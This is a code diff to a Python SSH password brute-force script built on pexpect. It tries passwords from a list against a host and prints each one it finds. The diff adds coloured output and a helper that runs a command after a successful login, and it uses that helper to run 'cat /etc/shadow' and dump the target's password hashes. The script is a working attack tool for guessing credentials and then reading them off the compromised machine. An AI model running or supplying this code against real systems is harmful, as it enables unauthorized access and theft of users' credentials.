@@ -3,8 +3,14 @@
 # Date: 01/11/2021
 
 import pexpect
+from colorama import Fore
 
 PROMPT = ['# ', '>>> ', '> ', '\$ ', '$ ']
+
+def send_command(connection, command):
+    connection.sendline(command)
+    connection.expect(PROMPT)
+    print(connection.before)
 
 def connect(user, host, password):
     ssh_newkey = 'Are you sure you want to continue connecting'
@@ -33,8 +39,9 @@ def main():
         password = password.strip('\n')
         try:
             spawn = connect(user, host, password)
-            print('[+] Password Found: ' + password)
+            print(Fore.GREEN + '[+] Password Found: ' + password)
+            send_command(spawn, 'cat /etc/shadow')
         except:
-            print('[-] Wrong Password: ' + password)
+            print(Fore.RED + '[-] Wrong Password: ' + password)
 
 main()
